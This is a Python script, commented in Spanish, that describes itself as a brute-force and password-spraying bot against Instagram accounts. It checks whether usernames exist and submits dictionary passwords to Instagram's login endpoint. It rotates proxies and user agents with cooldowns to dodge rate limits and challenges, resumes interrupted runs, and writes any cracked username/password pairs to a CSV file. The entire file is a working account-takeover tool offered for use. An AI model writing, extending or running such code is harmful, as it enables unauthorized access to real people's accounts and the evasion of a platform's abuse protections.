#!/usr/bin/env python3
"""Bot de fuerza bruta / password spraying contra Instagram."""
import argparse, csv, json, os, random, sys, time
import requests

LOGIN = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
PERFIL = "https://www.instagram.com/api/v1/users/web_profile_info/?username={}"
APP_ID = "936619743392459"
ESTADO = "progreso.json"
SALIDA = "resultados.csv"

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
]

COOLDOWN = {}


def cargar_lista(path):
    if not path:
        return []
    if not os.path.exists(path):
        sys.exit(f"[!] No existe el archivo: {path}")
    with open(path, encoding="utf-8", errors="ignore") as f:
        return [l.strip() for l in f if l.strip() and not l.startswith("#")]


def normalizar(p):
    p = p.strip()
    if not p:
        return None
    return p if "://" in p else "http://" + p


def elegir_proxy(proxies):
    ahora = time.time()
    libres = [p for p in proxies if COOLDOWN.get(p, 0) <= ahora]
    return random.choice(libres) if libres else None


def reposar(proxy, seg):
    if proxy:
        COOLDOWN[proxy] = time.time() + seg


def nueva_sesion(proxy):
    s = requests.Session()
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    s.headers.update({
        "User-Agent": random.choice(UAS),
        "Accept": "*/*",
        "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
        "X-IG-App-ID": APP_ID,
        "Origin": "https://www.instagram.com",
        "Referer": "https://www.instagram.com/",
    })
    try:
        s.get("https://www.instagram.com/", timeout=25)
    except requests.RequestException:
        return None, None
    csrf = s.cookies.get("csrftoken")
    if not csrf:
        return None, None
    s.headers["X-CSRFToken"] = csrf
    s.headers["X-Instagram-AJAX"] = "1"
    return s, csrf


def usuario_existe(s, usuario):
    try:
        r = s.get(PERFIL.format(usuario), timeout=25,
                  headers={"X-IG-App-ID": APP_ID})
        if r.status_code == 200:
            return bool(r.json().get("data", {}).get("user"))
        return True
    except Exception:
        return True


def intentar(s, csrf, usuario, password):
    data = {
        "username": usuario,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
        "queryParams": "{}",
        "optIntoOneTap": "false",
        "trustedDeviceRecords": "{}",
    }
    try:
        r = s.post(LOGIN, data=data, timeout=30, allow_redirects=False,
                   headers={"X-CSRFToken": csrf,
                            "Referer": "https://www.instagram.com/"})
    except requests.RequestException:
        return "rotar", {}
    if r.status_code == 429:
        return "rotar", {}
    try:
        j = r.json()
    except Exception:
        return "rotar", {}
    if j.get("authenticated"):
        return "ok", j
    if j.get("checkpoint_url") or j.get("checkpoint_required"):
        return "ok_checkpoint", j
    msg = (j.get("message") or "").lower()
    if "challenge" in msg or "checkpoint" in msg or "wait" in msg:
        return "rotar", j
    if j.get("user") is False:
        return "no_existe", j
    return "fallo", j


def registrar(writer, usuario, password, estado, proxy):
    writer.writerow([usuario, password, estado, proxy or "local",
                     time.strftime("%Y-%m-%d %H:%M:%S")])


def atacar(usuario, passwords, proxies, args, progreso, writer):
    inicio = progreso.get(usuario, 0)
    if inicio >= len(passwords):
        print(f"[=] {usuario}: ya estaba completado")
        return

    if not args.sin_comprobar:
        s, _ = nueva_sesion(elegir_proxy(proxies) if proxies else None)
        if s and not usuario_existe(s, usuario):
            print(f"[-] {usuario}: no existe")
            registrar(writer, usuario, "", "usuario_inexistente", None)
            progreso[usuario] = len(passwords)
            return

    i = inicio
    while i < len(passwords):
        proxy = elegir_proxy(proxies) if proxies else None
        if proxies and proxy is None:
            print("[~] Todas las IPs en reposo. Esperando 30s...")
            time.sleep(30)
            continue

        s, csrf = nueva_sesion(proxy)
        if s is None:
            print(f"[!] Proxy sin respuesta: {proxy}")
            reposar(proxy, args.reposo)
            continue

        usados = 0
        while i < len(passwords) and usados < args.por_ip:
            pwd = passwords[i]
            estado, j = intentar(s, csrf, usuario, pwd)
            print(f"    {usuario} : {pwd} -> {estado}")

            if estado in ("ok", "ok_checkpoint"):
                registrar(writer, usuario, pwd, estado, proxy)
                print(f"\n[+] ENCONTRADA: {usuario} / {pwd} ({estado})")
                if j.get("checkpoint_url"):
                    print(f"    Checkpoint: https://www.instagram.com{j['checkpoint_url']}")
                progreso[usuario] = len(passwords)
                return
            if estado == "no_existe":
                print(f"[-] {usuario}: no existe")
                registrar(writer, usuario, "", "usuario_inexistente", proxy)
                progreso[usuario] = len(passwords)
                return

            registrar(writer, usuario, pwd, "fallo", proxy)
            i += 1
            usados += 1
            progreso[usuario] = i
            if estado == "rotar":
                reposar(proxy, args.reposo)
                break
            time.sleep(random.uniform(args.espera, args.espera + 3))

        reposar(proxy, args.reposo)
    print(f"[x] {usuario}: diccionario agotado")


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--usuario", help="un solo usuario objetivo")
    p.add_argument("--usuarios", help="archivo con varios usuarios (modo spray)")
    p.add_argument("--passwords", required=True, help="diccionario de passwords")
    p.add_argument("--proxies", help="archivo de proxies (uno por linea)")
    p.add_argument("--por-ip", type=int, default=3, help="intentos antes de rotar")
    p.add_argument("--reposo", type=int, default=600, help="segundos de reposo de una IP")
    p.add_argument("--espera", type=float, default=2.0, help="pausa entre intentos")
    p.add_argument("--sin-comprobar", action="store_true",
                   help="omite la verificacion de existencia del usuario")
    args = p.parse_args()

    if not args.usuario and not args.usuarios:
        sys.exit("[!] Indica --usuario o --usuarios")

    objetivos = [args.usuario] if args.usuario else cargar_lista(args.usuarios)
    passwords = cargar_lista(args.passwords)
    proxies = [normalizar(x) for x in cargar_lista(args.proxies)]
    proxies = [x for x in proxies if x]

    if not passwords:
        sys.exit("[!] Diccionario vacio")
    if proxies:
        print(f"[i] {len(proxies)} proxies cargados")
    else:
        print("[i] Sin proxies: usaras tu IP local (muy pocos intentos)")

    progreso = {}
    if os.path.exists(ESTADO):
        with open(ESTADO) as f:
            progreso = json.load(f)

    nuevo = not os.path.exists(SALIDA)
    with open(SALIDA, "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        if nuevo:
            writer.writerow(["usuario", "password", "estado", "proxy", "fecha"])
        try:
            for u in objetivos:
                print(f"\n=== {u} ===")
                atacar(u, passwords, proxies, args, progreso, writer)
                f.flush()
                with open(ESTADO, "w") as fe:
                    json.dump(progreso, fe)
        except KeyboardInterrupt:
            print("\n[!] Interrumpido. Progreso guardado en progreso.json")


if __name__ == "__main__":
    main()
